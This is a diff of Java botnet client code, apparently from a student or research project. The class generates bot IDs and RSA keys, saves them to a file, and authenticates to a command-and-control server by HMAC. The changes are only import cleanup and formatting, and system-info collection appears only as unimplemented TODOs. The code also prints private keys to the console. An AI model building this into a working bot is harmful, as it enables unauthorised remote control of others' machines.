@@ -1,31 +1,20 @@
 package cs.sii.bot.passive;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileReader;
 import java.io.IOException;
-import java.io.PrintWriter;
-import java.io.UnsupportedEncodingException;
-import java.lang.reflect.Type;
 import java.security.NoSuchAlgorithmException;
 import java.security.NoSuchProviderException;
 import java.util.ArrayList;
-import java.util.List;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
-import org.springframework.web.client.RestTemplate;
 
 import cs.sii.bot.active.CryptoAuth;
 import cs.sii.bot.active.CryptoPKI;
 import cs.sii.config.bot.Engine;
-import cs.sii.domain.Conversions;
 import cs.sii.domain.FileUtil;
 import cs.sii.domain.Pairs;
 import cs.sii.service.connection.AsyncRequest;
 import cs.sii.service.connection.NetworkService;
-import javassist.bytecode.ByteArray;
-import javassist.compiler.SymbolTable;
 
 @Service
 public class BotInitialize {
@@ -44,7 +33,7 @@ public class BotInitialize {
 
 	@Autowired
 	private CryptoPKI pki;
-	
+
 	@Autowired
 	private FileUtil fileUtil;
 
@@ -53,23 +42,23 @@ public class BotInitialize {
 
 	public void initializeBot() throws IOException, NoSuchAlgorithmException, NoSuchProviderException {
 
-    	ArrayList<String> param=new ArrayList<String>();
-    	param=fileUtil.decodeFromFile();
-    	
-    	if(param.size()>0){
-    		String idBot=param.get(0);
-        	System.out.println("pubK "+param.get(1));
-        	System.out.println("pivK "+param.get(2));
-    		
-    	}else{
-    		pki.generateKeyRSA();
-    		ArrayList<Object> data = new ArrayList<Object>();
+		ArrayList<String> param = new ArrayList<String>();
+		param = fileUtil.decodeFromFile();
+
+		if (param.size() > 0) {
+			String idBot = param.get(0);
+			System.out.println("pubK " + param.get(1));
+			System.out.println("pivK " + param.get(2));
+
+		} else {
+			pki.generateKeyRSA();
+			ArrayList<Object> data = new ArrayList<Object>();
 			data.add(networkService.generateID());
 			data.add(pki.getPubRSAKey());
 			data.add(pki.getPrivRSAKey());
 			fileUtil.encodeToFile(data);
-    	}
-			
+		}
+
 		if (!engineBot.isCommandandconquerStatus()) {
 
 			// metter controllo ID se ==NULL genera altrimenti riusa
@@ -82,15 +71,15 @@ public class BotInitialize {
 				// push info online os
 				System.out.println("Bot is Ready");
 			} else
-				System.out.println("Bot not Ready, authentication failed");	
-		}	
+				System.out.println("Bot not Ready, authentication failed");
+		}
 	}
 
 	public void getInfo() {
 
-		//TODO prendi info sistema
+		// TODO prendi info sistema
 
-		//TODO pusha online info
+		// TODO pusha online info
 
 	}
 
@@ -106,7 +95,8 @@ public class BotInitialize {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
-			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(),networkService.getMac(),networkService.getCommandConquerIps().getIPList().get(0),hashMac);
+			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(), networkService.getMac(),
+					networkService.getCommandConquerIps().getIPList().get(0), hashMac);
 			System.out.println("La risposta del CeC: " + response);
 
 		}
